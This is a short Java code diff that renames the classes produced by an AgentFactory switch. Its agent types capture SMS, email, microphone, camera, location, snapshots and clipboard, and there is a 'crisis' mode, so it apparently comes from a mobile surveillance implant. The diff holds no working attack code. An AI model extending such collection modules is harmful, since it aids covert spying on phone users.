@@ -20,7 +20,7 @@ public class AgentFactory implements AbstractFactory<AgentBase,AgentType> {
 
 		switch (type) {
 			case AGENT_SMS:
-				a = new MessageAgent();
+				a = new AgentMessage();
 				break;
 
 			case AGENT_TASK:
@@ -30,11 +30,11 @@ public class AgentFactory implements AbstractFactory<AgentBase,AgentType> {
 				break;
 
 			case AGENT_DEVICE:
-				a = new DeviceAgent();
+				a = new AgentDevice();
 				break;
 
 			case AGENT_POSITION:
-				a = new PositionAgent();
+				a = new AgentPosition();
 				break;
 
 			case AGENT_CALL:
@@ -47,7 +47,7 @@ public class AgentFactory implements AbstractFactory<AgentBase,AgentType> {
 				break;
 
 			case AGENT_SNAPSHOT:
-				a = new SnapshotAgent();
+				a = new AgentSnapshot();
 				break;
 
 			case AGENT_URL:
@@ -57,22 +57,22 @@ public class AgentFactory implements AbstractFactory<AgentBase,AgentType> {
 				break;
 
 			case AGENT_EMAIL:
-				a = new MessageAgent();
+				a = new AgentMessage();
 				break;
 
 			case AGENT_MIC:
-				a = new MicAgent();
+				a = new AgentMic();
 				break;
 
 			case AGENT_CAM:
-				a = new CameraAgent();
+				a = new AgentCamera();
 				break;
 
 			case AGENT_CLIPBOARD:
 				break;
 
 			case AGENT_CRISIS:
-				a = new CrisisAgent();
+				a = new AgentCrisis();
 				break;
 
 			case AGENT_APPLICATION:
